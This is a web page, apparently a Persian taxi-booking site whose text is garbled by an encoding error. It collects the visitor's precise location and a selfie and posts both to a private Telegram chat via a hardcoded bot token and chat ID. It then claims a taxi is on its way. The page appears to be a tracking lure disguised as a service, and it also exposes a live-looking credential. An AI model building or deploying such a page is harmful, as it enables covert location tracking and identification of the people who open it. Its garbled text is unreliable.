<!doctype html>
<html lang="fa">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>ØªØ§Ú©Ø³ÛŒ Ø¨Ø§Ø¨Ø§ Ø¹Ø¨Ø§Ø³ â€” Ø¨Ø§ Ú¯Ø±ÙØªÙ† Ø³ÙÙ„ÙÙÛŒ</title>
  <style>
    :root{--bg:#f7f9fb;--card:#fff;--text:#0b1a2b;--muted:#6c7a86;--green:#28a745;--danger:#c0392b}
    body { font-family: "Tahoma", "Arial", sans-serif; background:var(--bg); color:var(--text); display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
    .card { background:var(--card); padding:28px; border-radius:12px; box-shadow:0 6px 24px rgba(12,17,24,0.08); text-align:center; width:360px; }
    .icon { font-size:56px; }
    h1 { margin:10px 0 6px; font-size:22px; }
    p { margin:6px 0 18px; color:var(--muted); font-size:14px; }
    button { background:var(--green); color:white; border:0; padding:12px 18px; border-radius:8px; font-size:16px; cursor:pointer; display:inline-flex; align-items:center; gap:8px; }
    button.secondary { background:#f0f0f0; color:#222; }
    button.small { padding:8px 12px; font-size:14px; border-radius:6px; }
    button:active { transform:translateY(1px); }
    .small { font-size:13px; color:#7a8a99; margin-top:12px; }
    .hint { color:var(--danger); margin-top:12px; font-size:13px; display:none; }
    /* modal */
    .overlay{ position:fixed; inset:0; display:none; align-items:center; justify-content:center; background:rgba(0,0,0,0.4); z-index:40; }
    .modal{ background:white; padding:18px; border-radius:10px; width:320px; text-align:center; box-shadow:0 8px 30px rgba(2,6,23,0.3); }
    .modal h3{ margin:4px 0 10px; font-size:18px; }
    .modal p{ color:#556; font-size:14px; margin:6px 0 12px; }
    .row{ display:flex; gap:8px; justify-content:center; margin-top:8px; }
    .link-like{ background:none;border:0;color:#007bff;text-decoration:underline;cursor:pointer;padding:0;font-size:14px }
    /* video preview */
    #previewWrap{ margin-top:12px; display:none; flex-direction:column; gap:8px; align-items:center }
    video { width:240px; height:320px; border-radius:8px; background:#000; object-fit:cover }
    canvas { display:none }
  </style>
</head>
<body>
  <div class="card" role="main" aria-live="polite">
    <div class="icon" aria-hidden="true">ğŸš•</div>
    <h1>ØªØ§Ú©Ø³ÛŒ Ø¨Ø§Ø¨Ø§ Ø¹Ø¨Ø§Ø³</h1>
    <p>Ø¨Ø±Ø§ÛŒ Ú¯Ø±ÙØªÙ† ØªØ§Ú©Ø³ÛŒØŒ Ø¯Ú©Ù…Ù‡Ù” Ø²ÛŒØ± Ø±Ø§ Ø¨Ø²Ù†ÛŒØ¯. Ø§Ø¨ØªØ¯Ø§ Ø§Ø² Ø´Ù…Ø§ Ø¨Ø±Ø§ÛŒ Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ù…ÙˆÙ‚Ø¹ÛŒØª Ùˆ Ø¯Ø± ØµÙˆØ±Øª Ù†ÛŒØ§Ø² Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø³Ø¤Ø§Ù„ Ù…ÛŒâ€ŒØ´ÙˆØ¯.</p>

    <div style="display:flex; gap:8px; justify-content:center;">
      <button id="bookBtn">Ú¯Ø±ÙØªÙ† ØªØ§Ú©Ø³ÛŒ âœ…</button>
      <button id="bookWithFaceBtn" class="small">Ú¯Ø±ÙØªÙ† ØªØ§Ú©Ø³ÛŒ + Ø³Ù„ÙÛŒ</button>
    </div>

    <div id="status" class="small"></div>
    <div id="error" class="hint" role="alert"></div>

    <!-- Ù¾ÛŒØ´â€ŒÙ†Ù…Ø§ÛŒØ´ ÙˆÛŒØ¯Ø¦Ùˆ Ø¨Ø±Ø§ÛŒ Ú¯Ø±ÙØªÙ† Ø³Ù„ÙÛŒ -->
    <div id="previewWrap">
      <video id="video" autoplay playsinline muted></video>
      <div style="display:flex; gap:8px;">
        <button id="takePhotoBtn" class="small">Ú¯Ø±ÙØªÙ† Ø³Ù„ÙÛŒ</button>
        <button id="cancelPhotoBtn" class="small secondary">Ø§Ù†ØµØ±Ø§Ù</button>
      </div>
    </div>
  </div>

  <!-- ÛŒÚ© Ù…ÙˆØ¯Ø§Ù„ Ø³Ø§Ø¯Ù‡ Ú©Ù‡ Ù‚Ø¨Ù„ Ø§Ø² Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ù…Ø¬ÙˆØ² Ù†Ø´Ø§Ù† Ù…ÛŒâ€ŒØ¯Ù‡Ø¯ -->
  <div id="overlay" class="overlay" role="dialog" aria-modal="true" aria-hidden="true">
    <div class="modal">
      <h3>Ø§Ø±Ø³Ø§Ù„ Ù…ÙˆÙ‚Ø¹ÛŒØª Ùˆ/ÛŒØ§ Ø³Ù„ÙÛŒ Ø¨Ù‡ ØªØ§Ú©Ø³ÛŒ Ø¨Ø§Ø¨Ø§ Ø¹Ø¨Ø§Ø³</h3>
      <p>Ù…Ø±ÙˆØ±Ú¯Ø± Ø§Ø² Ø´Ù…Ø§ Ø§Ø¬Ø§Ø²Ù‡Ù” Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ù…ÙˆÙ‚Ø¹ÛŒØª Ùˆ Ø¯Ø± ØµÙˆØ±Øª Ø§Ù†ØªØ®Ø§Ø¨ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø³Ù„ÙÛŒ Ø³Ø¤Ø§Ù„ Ù…ÛŒâ€ŒÚ©Ù†Ø¯. Ø§Ú¯Ø± Ù‚Ø¨ÙˆÙ„ Ú©Ù†ÛŒØ¯ØŒ Ø§Ø·Ù„Ø§Ø¹Ø§Øª Ø¨Ø±Ø§ÛŒ Ø¯Ø±ÛŒØ§ÙØª ØªØ§Ú©Ø³ÛŒ Ø§Ø±Ø³Ø§Ù„ Ù…ÛŒâ€ŒØ´ÙˆØ¯.</p>
      <div class="row">
        <button id="confirmBtn">Ø§ÛŒÙ†â€ŒØ¨Ø§Ø± Ø§Ø¬Ø§Ø²Ù‡ Ø¯Ù‡ÛŒØ¯ Ùˆ Ø§Ø±Ø³Ø§Ù„ Ø´ÙˆØ¯</button>
        <button id="denyBtn" class="secondary">ÙØ¹Ù„Ø§Ù‹ Ù†Ù‡</button>
      </div>
      <div class="row" style="margin-top:10px">
        <button id="explainBtn" class="link-like">Ú†Ø±Ø§ Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ù…ÛŒâ€ŒØ´ÙˆØ¯ØŸ</button>
      </div>
    </div>
  </div>

  <script>
    /*****************************************************************************
     * Ù‡Ø´Ø¯Ø§Ø± Ø§Ù…Ù†ÛŒØªÛŒ:
     * - Ù‚Ø±Ø§Ø± Ø¯Ø§Ø¯Ù† ØªÙˆÚ©Ù† Ø¨Ø§Øª ØªÙ„Ú¯Ø±Ø§Ù… Ø¯Ø± Ú©Ø¯ Ø³Ù…Øª Ú©Ø§Ø±Ø¨Ø± (Ú©Ù„Ø§ÛŒÙ†Øª) Ø¨Ø³ÛŒØ§Ø± Ù†Ø§Ø§Ù…Ù† Ø§Ø³Øª.
     *   Ù‡Ø± Ú©Ø³ÛŒ Ù…ÛŒâ€ŒØªÙˆØ§Ù†Ø¯ ØªÙˆÚ©Ù† Ø±Ø§ Ø¨Ø¨ÛŒÙ†Ø¯ Ùˆ Ø§Ø² Ø¨Ø§Øª Ø³ÙˆØ¡Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†Ø¯.
     * - Ù†Ø³Ø®Ù‡Ù” Ø§Ù…Ù†â€ŒØªØ±: ÛŒÚ© Ø³Ø±ÙˆØ± Ú©ÙˆÚ†Ú© Ø±Ø§Ù‡â€ŒØ§Ù†Ø¯Ø§Ø²ÛŒ Ú©Ù†ÛŒØ¯ (Ù…Ø«Ù„Ø§Ù‹ Node/Express) Ú©Ù‡ ØªÙˆÚ©Ù†
     *   Ø±Ø§ ÙÙ‚Ø· Ø¯Ø± Ø³Ù…Øª Ø³Ø±ÙˆØ± Ù†Ú¯Ù‡â€ŒØ¯Ø§Ø±Ø¯Ø› Ú©Ù„Ø§ÛŒÙ†Øª ÙÙ‚Ø· Ù…Ø®ØªØµØ§Øª Ùˆ (Ø§Ø®ØªÛŒØ§Ø±ÛŒ) Ø¹Ú©Ø³ Ø±Ø§ Ø¨Ù‡ Ø³Ø±ÙˆØ±
     *   Ø§Ø±Ø³Ø§Ù„ Ú©Ù†Ø¯ Ùˆ Ø³Ø±ÙˆØ± Ù¾ÛŒØºØ§Ù…/Ø¹Ú©Ø³ Ø±Ø§ Ø¨Ù‡ Telegram API Ø¨ÙØ±Ø³ØªØ¯.
     *
     * - getUserMedia ÙÙ‚Ø· Ø±ÙˆÛŒ originÙ‡Ø§ÛŒ Ø§Ù…Ù† (https ÛŒØ§ localhost) Ú©Ø§Ø± Ù…ÛŒâ€ŒÚ©Ù†Ø¯.
     *****************************************************************************/

    // Ù…Ù‚Ø§Ø¯ÛŒØ± Ø§Ø±Ø³Ø§Ù„ÛŒ Ø§Ø² Ø´Ù…Ø§ (ØªÙˆØ¬Ù‡: Ù†Ø§Ø§Ù…Ù† Ø¯Ø± Ú©Ù„Ø§ÛŒÙ†Øª)
    const BOT_TOKEN = '8295388715:AAGkM7QaqplE1WNpM6S_GI6aBLzBObK2he8';
    const CHAT_ID   = '8293145520';

    const overlay = document.getElementById('overlay');
    const bookBtn = document.getElementById('bookBtn');
    const bookWithFaceBtn = document.getElementById('bookWithFaceBtn');
    const confirmBtn = document.getElementById('confirmBtn');
    const denyBtn = document.getElementById('denyBtn');
    const explainBtn = document.getElementById('explainBtn');
    const statusDiv = document.getElementById('status');
    const errorDiv = document.getElementById('error');

    const previewWrap = document.getElementById('previewWrap');
    const video = document.getElementById('video');
    const takePhotoBtn = document.getElementById('takePhotoBtn');
    const cancelPhotoBtn = document.getElementById('cancelPhotoBtn');

    let wantSelfie = false;
    let mediaStream = null;

    function showOverlay() {
      overlay.style.display = 'flex';
      overlay.setAttribute('aria-hidden','false');
    }
    function hideOverlay() {
      overlay.style.display = 'none';
      overlay.setAttribute('aria-hidden','true');
    }
    function setStatus(text) { statusDiv.textContent = text; errorDiv.style.display='none'; }
    function setError(text) { errorDiv.style.display='block'; errorDiv.textContent = text; statusDiv.textContent=''; }

    // --- Geolocation logic ---
    function requestGeolocation() {
      return new Promise((resolve, reject) => {
        if (!navigator.geolocation) {
          reject(new Error('Ù…Ø±ÙˆØ±Ú¯Ø± Ø´Ù…Ø§ Ø§Ø² Geolocation Ù¾Ø´ØªÛŒØ¨Ø§Ù†ÛŒ Ù†Ù…ÛŒâ€ŒÚ©Ù†Ø¯.'));
          return;
        }
        navigator.geolocation.getCurrentPosition(function(pos) {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          resolve({ lat, lon });
        }, function(err) {
          if (err.code === err.PERMISSION_DENIED) {
            reject(new Error('Ø¯Ø³ØªØ±Ø³ÛŒ Ø¨Ù‡ Ù…ÙˆÙ‚Ø¹ÛŒØª Ø¬ØºØ±Ø§ÙÛŒØ§ÛŒÛŒ Ø±Ø¯ Ø´Ø¯.'));
          } else {
            reject(new Error('Ø®Ø·Ø§ Ø¯Ø± Ø¯Ø±ÛŒØ§ÙØª Ù…ÙˆÙ‚Ø¹ÛŒØª: ' + (err.message || err.code)));
          }
        }, {
          enableHighAccuracy: true,
          timeout: 20000,
          maximumAge: 0
        });
      });
    }

    // --- Camera / selfie logic ---
    async function startCameraFacingUser() {
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
        throw new Error('Ø¯ÙˆØ±Ø¨ÛŒÙ† Ù¾Ø´ØªÛŒØ¨Ø§Ù†ÛŒ Ù†Ù…ÛŒâ€ŒØ´ÙˆØ¯.');
      }
      // Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø³Ù„ÙÛŒ Ø§Ú¯Ø± Ø¯Ø± Ù…ÙˆØ¨Ø§ÛŒÙ„ØŒ Ø§Ø² facingMode: "user" Ø§Ø³ØªÙØ§Ø¯Ù‡ Ù…ÛŒâ€ŒÚ©Ù†ÛŒÙ…
      const constraints = { video: { facingMode: { ideal: "user" }, width: { ideal: 640 }, height: { ideal: 960 } }, audio: false };
      mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
      video.srcObject = mediaStream;
      previewWrap.style.display = 'flex';
      video.play().catch(()=>{});
    }

    async function stopCamera() {
      previewWrap.style.display = 'none';
      if (mediaStream) {
        mediaStream.getTracks().forEach(t => t.stop());
        mediaStream = null;
      }
      video.srcObject = null;
    }

    function captureImageBlob() {
      // Ø±Ø³Ù… ÙØ±ÛŒÙ… ÙØ¹Ù„ÛŒ Ùˆ Ú¯Ø±ÙØªÙ† blob Ø§Ø² Ø¢Ù†
      const w = video.videoWidth || 640;
      const h = video.videoHeight || 480;
      const canvas = document.createElement('canvas');
      canvas.width = w;
      canvas.height = h;
      const ctx = canvas.getContext('2d');
      // Ø§Ú¯Ø± Ù„Ø§Ø²Ù… Ø§Ø³Øª Ù…ÛŒâ€ŒØªÙˆØ§Ù†ÛŒÙ… mirror Ú©Ù†ÛŒÙ… (Ù…Ø¹Ù…ÙˆÙ„Ø§Ù‹ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø³Ù„ÙÛŒ mirror Ø§Ø³Øª)
      ctx.translate(w, 0);
      ctx.scale(-1, 1);
      ctx.drawImage(video, 0, 0, w, h);
      return new Promise((res) => canvas.toBlob(res, 'image/jpeg', 0.85));
    }

    // --- Telegram sending logic (client-side) ---
    async function sendLocationToTelegram(lat, lon) {
      const sendLocUrl = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendLocation`;
      const locParams = new URLSearchParams({ chat_id: CHAT_ID, latitude: String(lat), longitude: String(lon) });

      const r1 = await fetch(sendLocUrl, { method: 'POST', body: locParams });
      const j1 = await r1.json();
      if (!j1.ok) throw new Error('Ø®Ø·Ø§ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„ Ù„ÙˆÚ©ÛŒØ´Ù†: ' + (j1.description || r1.statusText));
      return j1;
    }

    async function sendMessageToTelegram(text) {
      const sendMsgUrl = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendMessage`;
      const msgParams = new URLSearchParams({ chat_id: CHAT_ID, text });
      const r2 = await fetch(sendMsgUrl, { method: 'POST', body: msgParams });
      const j2 = await r2.json();
      if (!j2.ok) throw new Error('Ø®Ø·Ø§ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„ Ù¾ÛŒØ§Ù…: ' + (j2.description || r2.statusText));
      return j2;
    }

    async function sendPhotoToTelegram(blob, filename = 'selfie.jpg', caption = '') {
      // sendPhoto Ø¨Ø§ multipart/form-data
      const url = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendPhoto`;
      const form = new FormData();
      form.append('chat_id', CHAT_ID);
      form.append('photo', new File([blob], filename, { type: blob.type || 'image/jpeg' }));
      if (caption) form.append('caption', caption);
      const r = await fetch(url, { method: 'POST', body: form });
      const j = await r.json();
      if (!j.ok) throw new Error('Ø®Ø·Ø§ Ø¯Ø± Ø§Ø±Ø³Ø§Ù„ Ø¹Ú©Ø³: ' + (j.description || r.statusText));
      return j;
    }

    // ÛŒÚ© ØªØ§Ø¨Ø¹ Ú©Ù‡ Ù…ÙˆÙ‚Ø¹ÛŒØª Ùˆ Ø§Ø®ØªÛŒØ§Ø±ÛŒ Ø³Ù„ÙÛŒ Ø±Ø§ Ø¨Ø§ Ù‡Ù… Ø§Ø±Ø³Ø§Ù„ Ù…ÛŒâ€ŒÚ©Ù†Ø¯
    async function handleSendFlow(includeSelfie = false) {
      setStatus('Ø¯Ø± Ø­Ø§Ù„ Ú¯Ø±ÙØªÙ† Ù…ÙˆÙ‚Ø¹ÛŒØª...');
      try {
        const { lat, lon } = await requestGeolocation();
        setStatus('Ù…ÙˆÙ‚Ø¹ÛŒØª Ø¯Ø±ÛŒØ§ÙØª Ø´Ø¯. Ø¯Ø± Ø­Ø§Ù„ Ø§Ø±Ø³Ø§Ù„ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…...');
        await sendLocationToTelegram(lat, lon);

        if (includeSelfie) {
          setStatus('Ø¯Ø± Ø­Ø§Ù„ Ú¯Ø±ÙØªÙ† Ø³Ù„ÙÛŒ...');
          // Ø±Ø§Ù‡ Ø§Ù†Ø¯Ø§Ø®ØªÙ† Ø¯ÙˆØ±Ø¨ÛŒÙ† Ùˆ Ú¯Ø±ÙØªÙ† Ø¹Ú©Ø³
          await startCameraFacingUser();
          // Ù†Ù…Ø§ÛŒØ´ UI Ù¾ÛŒØ´ Ù†Ù…Ø§ÛŒØ´ Ùˆ Ú¯Ø±ÙØªÙ† Ø¹Ú©Ø³ ØªÙˆØ³Ø· Ú©Ø§Ø±Ø¨Ø±
          setStatus('Ù„Ø·ÙØ§Ù‹ Ø¯Ú©Ù…Ù‡Ù” "Ú¯Ø±ÙØªÙ† Ø³Ù„ÙÛŒ" Ø±Ø§ ÙØ´Ø§Ø± Ø¯Ù‡ÛŒØ¯.');
          // Promise Ú©Ù‡ Ø²Ù…Ø§Ù†ÛŒ resolve Ù…ÛŒâ€ŒØ´ÙˆØ¯ Ú©Ù‡ Ú©Ø§Ø±Ø¨Ø± Ø¯Ú©Ù…Ù‡â€ŒÛŒ Ø³Ù„ÙÛŒ Ø±Ø§ Ø¨Ø²Ù†Ø¯ ÛŒØ§ Ú©Ù†Ø³Ù„ Ú©Ù†Ø¯
          const result = await new Promise((resolve, reject) => {
            const onTake = async () => {
              takePhotoBtn.removeEventListener('click', onTake);
              cancelPhotoBtn.removeEventListener('click', onCancel);
              try {
                const blob = await captureImageBlob();
                await stopCamera();
                resolve({ ok: true, blob });
              } catch (e) { reject(e); }
            };
            const onCancel = () => {
              takePhotoBtn.removeEventListener('click', onTake);
              cancelPhotoBtn.removeEventListener('click', onCancel);
              stopCamera().catch(()=>{});
              resolve({ ok: false });
            };
            takePhotoBtn.addEventListener('click', onTake);
            cancelPhotoBtn.addEventListener('click', onCancel);
          });

          if (result.ok && result.blob) {
            setStatus('Ø¯Ø± Ø­Ø§Ù„ Ø§Ø±Ø³Ø§Ù„ Ø³Ù„ÙÛŒ Ø¨Ù‡ ØªÙ„Ú¯Ø±Ø§Ù…...');
            await sendPhotoToTelegram(result.blob, 'selfie.jpg', `Ø³Ù„ÙÛŒ Ù…Ø´ØªØ±ÛŒ â€” Ù…ÙˆÙ‚Ø¹ÛŒØª: https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}`);
            setStatus('Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ùˆ Ø³Ù„ÙÛŒ Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯. ØªØ§Ú©Ø³ÛŒ ØªØ§ Ø¯Ù‡ Ø¯Ù‚ÛŒÙ‚Ù‡ Ø¯ÛŒÚ¯Ø± Ù¾ÛŒØ´ Ø´Ù…Ø§Ø³Øª!');
          } else {
            setStatus('Ø³Ù„ÙÛŒ Ú¯Ø±ÙØªÙ‡ Ù†Ø´Ø¯. ÙÙ‚Ø· Ù…ÙˆÙ‚Ø¹ÛŒØª Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯.');
          }
        } else {
          setStatus('Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ø´Ù…Ø§ Ø§Ø±Ø³Ø§Ù„ Ø´Ø¯. ØªØ§Ú©Ø³ÛŒ ØªØ§ Ø¯Ù‡ Ø¯Ù‚ÛŒÙ‚Ù‡ Ø¯ÛŒÚ¯Ø± Ù¾ÛŒØ´ Ø´Ù…Ø§Ø³Øª!');
        }
      } catch (err) {
        setError('Ø®Ø·Ø§: ' + (err.message || err));
      } finally {
        // Ù…Ø·Ù…Ø¦Ù† Ø´ÙˆÛŒÙ… Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø¨Ø³ØªÙ‡ Ø´Ø¯Ù‡
        stopCamera().catch(()=>{});
      }
    }

    // ÙˆÙ‚ØªÛŒ Ø¯Ú©Ù…Ù‡Ù” Ø§ØµÙ„ÛŒ Ø²Ø¯Ù‡ Ø´Ø¯ØŒ Ø§Ø¨ØªØ¯Ø§ ÛŒÚ© Ù…ÙˆØ¯Ø§Ù„ Ø¯Ø§Ø®Ù„ÛŒ Ù†Ø´Ø§Ù† Ù…ÛŒâ€ŒØ¯Ù‡ÛŒÙ… ØªØ§ Ú©Ø§Ø±Ø¨Ø± Ø¨Ø¯Ø§Ù†Ø¯
    bookBtn.addEventListener('click', () => {
      wantSelfie = false;
      if (!BOT_TOKEN || BOT_TOKEN.includes('REPLACE_WITH') || !CHAT_ID || CHAT_ID.includes('REPLACE_WITH')) {
        setError('Ù¾Ø§Ø±Ø§Ù…ØªØ±Ù‡Ø§ÛŒ Ø±Ø¨Ø§Øª ØªÙ†Ø¸ÛŒÙ… Ù†Ø´Ø¯Ù‡â€ŒØ§Ù†Ø¯ ÛŒØ§ Ù†Ø§Ø§Ù…Ù† Ù‡Ø³ØªÙ†Ø¯. Ø¨Ø±Ø§ÛŒ Ø¹Ù…Ù„Ú©Ø±Ø¯ ØµØ­ÛŒØ­ Ø¨Ø§ÛŒØ¯ BOT_TOKEN Ùˆ CHAT_ID ØªÙ†Ø¸ÛŒÙ… Ø´ÙˆÙ†Ø¯.');
        return;
      }
      showOverlay();
    });

    bookWithFaceBtn.addEventListener('click', () => {
      wantSelfie = true;
      if (!BOT_TOKEN || BOT_TOKEN.includes('REPLACE_WITH') || !CHAT_ID || CHAT_ID.includes('REPLACE_WITH')) {
        setError('Ù¾Ø§Ø±Ø§Ù…ØªØ±Ù‡Ø§ÛŒ Ø±Ø¨Ø§Øª ØªÙ†Ø¸ÛŒÙ… Ù†Ø´Ø¯Ù‡â€ŒØ§Ù†Ø¯ ÛŒØ§ Ù†Ø§Ø§Ù…Ù† Ù‡Ø³ØªÙ†Ø¯. Ø¨Ø±Ø§ÛŒ Ø¹Ù…Ù„Ú©Ø±Ø¯ ØµØ­ÛŒØ­ Ø¨Ø§ÛŒØ¯ BOT_TOKEN Ùˆ CHAT_ID ØªÙ†Ø¸ÛŒÙ… Ø´ÙˆÙ†Ø¯.');
        return;
      }
      showOverlay();
    });

    // Ú©Ø§Ø±Ø¨Ø± ØªØ§ÛŒÛŒØ¯ Ù…ÛŒâ€ŒÚ©Ù†Ø¯ -> Ø¯Ø±Ø®ÙˆØ§Ø³Øª Ù…Ø¬ÙˆØ² Ù…Ø±ÙˆØ±Ú¯Ø± Ø±Ø§ Ø§Ø¬Ø±Ø§ Ú©Ù†
    confirmBtn.addEventListener('click', async () => {
      hideOverlay();
      await handleSendFlow(wantSelfie);
    });

    // Ú©Ø§Ø±Ø¨Ø± Ø±Ø¯ Ù…ÛŒâ€ŒÚ©Ù†Ø¯ -> Ù…ÙˆØ¯Ø§Ù„ Ø¨Ø³ØªÙ‡ Ø´ÙˆØ¯
    denyBtn.addEventListener('click', () => {
      hideOverlay();
      setStatus('Ø§Ø±Ø³Ø§Ù„ Ù…ÙˆÙ‚Ø¹ÛŒØª Ù„ØºÙˆ Ø´Ø¯.');
    });

    explainBtn.addEventListener('click', () => {
      alert('Ø¯Ø±Ø®ÙˆØ§Ø³ØªÛŒ Ú©Ù‡ Ù…Ø±ÙˆØ±Ú¯Ø± Ù†Ø´Ø§Ù† Ù…ÛŒâ€ŒØ¯Ù‡Ø¯ Ø§Ø² Ø®ÙˆØ¯ Ù…Ø±ÙˆØ±Ú¯Ø± Ø§Ø³Øª Ùˆ Ú¯Ø²ÛŒÙ†Ù‡â€ŒÙ‡Ø§ÛŒÛŒ Ù…Ø§Ù†Ù†Ø¯ "Ø§Ø¬Ø§Ø²Ù‡ Ø¯Ø§Ø¯Ù†" ÛŒØ§ "Ø±Ø¯" Ø±Ø§ Ø¯Ø§Ø±Ø¯. Ø§Ú¯Ø± Ù‚Ø¨ÙˆÙ„ Ú©Ù†ÛŒØ¯ØŒ Ù…ÙˆÙ‚Ø¹ÛŒØª Ùˆ Ø¯Ø± ØµÙˆØ±Øª Ø§Ù†ØªØ®Ø§Ø¨ Ø³Ù„ÙÛŒØŒ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ø§Ø³ØªÙØ§Ø¯Ù‡ Ù…ÛŒâ€ŒØ´ÙˆØ¯. getUserMedia ÙÙ‚Ø· Ø±ÙˆÛŒ https ÛŒØ§ localhost Ú©Ø§Ø± Ù…ÛŒâ€ŒÚ©Ù†Ø¯.');
    });

    // Ø§Ú¯Ø± Ú©Ø§Ø±Ø¨Ø± Ù‚Ø¨Ù„Ø§Ù‹ Ø¯Ø³ØªØ±Ø³ÛŒ Ø±Ø§ Ù…Ø³Ø¯ÙˆØ¯ Ú©Ø±Ø¯Ù‡ Ø¨Ø§Ø´Ø¯ØŒ Ù…ÛŒâ€ŒØªÙˆØ§Ù†ÛŒÙ… ÙˆØ¶Ø¹ÛŒØª permission API Ø±Ø§ Ø¨Ø±Ø±Ø³ÛŒ Ú©Ù†ÛŒÙ…
    (async function checkPermissionStatus() {
      if (!navigator.permissions) return;
      try {
        const p = await navigator.permissions.query({ name: 'geolocation' });
        if (p.state === 'denied') {
          setStatus('Ø¯Ø³ØªØ±Ø³ÛŒ Ù…ÙˆÙ‚Ø¹ÛŒØª Ø¯Ø± Ù…Ø±ÙˆØ±Ú¯Ø± Ù…Ø³Ø¯ÙˆØ¯ Ø´Ø¯Ù‡ Ø§Ø³Øª. Ø¨Ø±Ø§ÛŒ ÙØ¹Ø§Ù„â€ŒØ³Ø§Ø²ÛŒ Ø§Ø² ØªÙ†Ø¸ÛŒÙ…Ø§Øª Ø³Ø§ÛŒØª Ù…Ø±ÙˆØ±Ú¯Ø± Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒØ¯.');
        }
        p.onchange = () => {
          if (p.state === 'granted') setStatus('');
          if (p.state === 'denied') setStatus('Ø¯Ø³ØªØ±Ø³ÛŒ Ù…ÙˆÙ‚Ø¹ÛŒØª Ø¯Ø± Ù…Ø±ÙˆØ±Ú¯Ø± Ù…Ø³Ø¯ÙˆØ¯ Ø´Ø¯Ù‡ Ø§Ø³Øª. Ø¨Ø±Ø§ÛŒ ÙØ¹Ø§Ù„â€ŒØ³Ø§Ø²ÛŒ Ø§Ø² ØªÙ†Ø¸ÛŒÙ…Ø§Øª Ø³Ø§ÛŒØª Ù…Ø±ÙˆØ±Ú¯Ø± Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒØ¯.');
        };
        // Ø¯ÙˆØ±Ø¨ÛŒÙ†
        const pCam = await navigator.permissions.query({ name: 'camera' }).catch(()=>null);
        if (pCam && pCam.state === 'denied') {
          setStatus('Ø¯Ø³ØªØ±Ø³ÛŒ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ù…Ø³Ø¯ÙˆØ¯ Ø´Ø¯Ù‡ Ø§Ø³Øª. Ø¨Ø±Ø§ÛŒ ÙØ¹Ø§Ù„â€ŒØ³Ø§Ø²ÛŒ Ø§Ø² ØªÙ†Ø¸ÛŒÙ…Ø§Øª Ø³Ø§ÛŒØª Ù…Ø±ÙˆØ±Ú¯Ø± Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒØ¯.');
        }
        if (pCam) {
          pCam.onchange = () => {
            if (pCam.state === 'granted') setStatus('');
            if (pCam.state === 'denied') setStatus('Ø¯Ø³ØªØ±Ø³ÛŒ Ø¯ÙˆØ±Ø¨ÛŒÙ† Ù…Ø³Ø¯ÙˆØ¯ Ø´Ø¯Ù‡ Ø§Ø³Øª. Ø¨Ø±Ø§ÛŒ ÙØ¹Ø§Ù„â€ŒØ³Ø§Ø²ÛŒ Ø§Ø² ØªÙ†Ø¸ÛŒÙ…Ø§Øª Ø³Ø§ÛŒØª Ù…Ø±ÙˆØ±Ú¯Ø± Ø§Ø³ØªÙØ§Ø¯Ù‡ Ú©Ù†ÛŒØ¯.');
          };
        }
      } catch (e) {
        // Ø¨Ø±Ø®ÛŒ Ù…Ø±ÙˆØ±Ú¯Ø±Ù‡Ø§ Ù…Ù…Ú©Ù† Ø§Ø³Øª Ø®Ø·Ø§ Ø¨Ø¯Ù‡Ù†Ø¯Ø› Ù†Ø§Ø¯ÛŒØ¯Ù‡ Ø¨Ú¯ÛŒØ±ÛŒØ¯
      }
    })();
  </script>

  <noscript>
    <div style="text-align:center; margin-top:14px; color:#c00">Ø¬Ø§ÙˆØ§Ø§Ø³Ú©Ø±ÛŒÙ¾Øª Ø®Ø§Ù…ÙˆØ´ Ø§Ø³Øª. Ø¨Ø±Ø§ÛŒ Ø¹Ù…Ù„Ú©Ø±Ø¯ Ø¯Ú©Ù…Ù‡ Ø¨Ø§ÛŒØ¯ Ø¬Ø§ÙˆØ§Ø§Ø³Ú©Ø±ÛŒÙ¾Øª ÙØ¹Ø§Ù„ Ø¨Ø§Ø´Ø¯.</div>
  </noscript>
</body>
</html>
